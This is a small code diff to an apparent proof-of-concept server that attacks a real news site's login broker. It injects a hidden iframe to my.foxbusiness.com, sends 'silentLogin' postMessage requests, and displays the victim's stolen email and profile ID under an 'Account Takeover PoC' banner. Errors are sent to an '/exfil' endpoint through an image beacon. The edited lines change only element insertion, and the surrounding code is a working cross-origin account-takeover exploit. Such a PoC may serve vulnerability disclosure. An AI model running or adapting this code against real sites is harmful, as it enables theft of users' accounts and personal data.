@@ -65,7 +65,7 @@ const server = http.createServer((req, res) => {
         f.id = 'xdchannel';
         f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
         f.style.display = 'none';
-        (document.body || document.documentElement).appendChild(f);
+        document.body.appendChild(f);
         f.onload = function() {
           f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
           f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
@@ -112,7 +112,7 @@ const server = http.createServer((req, res) => {
     var b = document.createElement('div');
     b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
     b.textContent = 'Account Takeover PoC - Stolen: ' + profile.email + ' (' + profile.profileId + ')';
-    (document.body || document.documentElement).prepend(b);
+    document.body.prepend(b);
 
   } catch(e) {
     new Image().src = '${SELF}/exfil?err=' + encodeURIComponent(String(e));
